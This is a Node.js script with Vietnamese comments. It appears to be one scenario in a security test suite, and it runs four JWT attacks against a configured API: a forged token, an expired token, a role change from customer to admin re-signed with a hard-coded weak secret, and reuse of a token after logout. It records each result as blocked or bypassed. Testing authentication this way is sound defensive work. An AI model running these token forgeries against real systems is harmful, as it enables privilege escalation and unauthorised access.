/**
 * Kịch bản 2: Tấn công JWT
 *
 * Mục tiêu:
 * - Giả mạo token với secret khác
 * - Sử dụng token hết hạn
 * - Thay đổi role trong payload (privilege escalation)
 * - Tái sử dụng token sau khi đăng xuất
 */
const axios = require('axios');
const jwt = require('jsonwebtoken');
const config = require('./config');
const { saveResult, printHeader } = require('./utils');

const ATTACK_NAME = 'JWT_ATTACK';

const main = async () => {
  const target = config.target;
  printHeader(ATTACK_NAME, target.name);

  const results = {
    target: target.name,
    tests: [],
    startTime: new Date().toISOString(),
  };

  // Bước 0: Đăng nhập hợp lệ
  let validToken = null;
  try {
    const loginRes = await axios.post(`${target.api}/auth/login`, {
      identifier: config.accounts.customer.identifier,
      password: config.accounts.customer.password,
    });
    validToken = loginRes.data.data?.accessToken || loginRes.data.accessToken;
    console.log('  [0] Đăng nhập hợp lệ: OK\n');
  } catch (err) {
    console.log('  [0] Đăng nhập thất bại, dừng test\n');
    return;
  }

  // Test 1: Token giả mạo (sai secret)
  console.log('  --- Test 1: Token giả mạo (sai secret) ---');
  const forgedToken = jwt.sign(
    { userId: '000000000000000000000000', role: 'admin', type: 'access' },
    'fake-secret-key',
    { expiresIn: '1d' }
  );
  try {
    const res = await axios.get(`${target.api}/users/profile`, {
      headers: { Authorization: `Bearer ${forgedToken}` },
    });
    results.tests.push({ test: 'forged_token', status: res.status, result: 'BYPASSED' });
    console.log(`  → ${res.status} BYPASSED !!!\n`);
  } catch (err) {
    const status = err.response?.status || 'ERROR';
    results.tests.push({ test: 'forged_token', status, result: 'BLOCKED' });
    console.log(`  → ${status} BLOCKED\n`);
  }

  // Test 2: Token hết hạn
  console.log('  --- Test 2: Token hết hạn ---');
  const expiredToken = jwt.sign(
    { userId: '000000000000000000000000', role: 'customer', type: 'access' },
    'insecure-jwt-secret-key-for-testing',
    { expiresIn: '0s' }
  );
  await new Promise(r => setTimeout(r, 1000));
  try {
    const res = await axios.get(`${target.api}/users/profile`, {
      headers: { Authorization: `Bearer ${expiredToken}` },
    });
    results.tests.push({ test: 'expired_token', status: res.status, result: 'BYPASSED' });
    console.log(`  → ${res.status} BYPASSED !!!\n`);
  } catch (err) {
    const status = err.response?.status || 'ERROR';
    results.tests.push({ test: 'expired_token', status, result: 'BLOCKED' });
    console.log(`  → ${status} BLOCKED\n`);
  }

  // Test 3: Privilege Escalation (customer → admin)
  console.log('  --- Test 3: Privilege Escalation (customer → admin) ---');
  if (validToken) {
    const { exp, iat, ...payload } = jwt.decode(validToken);
    const tamperedToken = jwt.sign(
      { ...payload, role: 'admin' },
      'insecure-jwt-secret-key-for-testing',
      { expiresIn: '1d' }
    );
    try {
      const res = await axios.get(`${target.api}/admin/users`, {
        headers: { Authorization: `Bearer ${tamperedToken}` },
      });
      results.tests.push({ test: 'role_tampering', status: res.status, result: 'BYPASSED' });
      console.log(`  → ${res.status} BYPASSED !!!\n`);
    } catch (err) {
      const status = err.response?.status || 'ERROR';
      results.tests.push({ test: 'role_tampering', status, result: 'BLOCKED' });
      console.log(`  → ${status} BLOCKED\n`);
    }
  }

  // Test 4: Token reuse sau logout
  console.log('  --- Test 4: Token reuse after logout ---');
  if (validToken) {
    try {
      await axios.post(`${target.api}/auth/logout`, {}, {
        headers: { Authorization: `Bearer ${validToken}` },
      });
      console.log('  [4a] Logout: OK');
    } catch (err) {
      console.log(`  [4a] Logout: ${err.response?.status || 'ERROR'}`);
    }

    try {
      const res = await axios.get(`${target.api}/users/profile`, {
        headers: { Authorization: `Bearer ${validToken}` },
      });
      results.tests.push({ test: 'token_after_logout', status: res.status, result: 'BYPASSED' });
      console.log(`  [4b] Token reuse → ${res.status} BYPASSED !!!\n`);
    } catch (err) {
      const status = err.response?.status || 'ERROR';
      results.tests.push({ test: 'token_after_logout', status, result: 'BLOCKED' });
      console.log(`  [4b] Token reuse → ${status} BLOCKED\n`);
    }
  }

  results.endTime = new Date().toISOString();
  saveResult(ATTACK_NAME, target.name, results);

  // Summary
  const bypassed = results.tests.filter(t => t.result === 'BYPASSED').length;
  const blocked = results.tests.filter(t => t.result === 'BLOCKED').length;
  console.log('\n  ' + '='.repeat(50));
  console.log(`  TỔNG KẾT: ${blocked} BLOCKED | ${bypassed} BYPASSED`);
  console.log('  ' + '='.repeat(50));
};

main().catch(console.error);
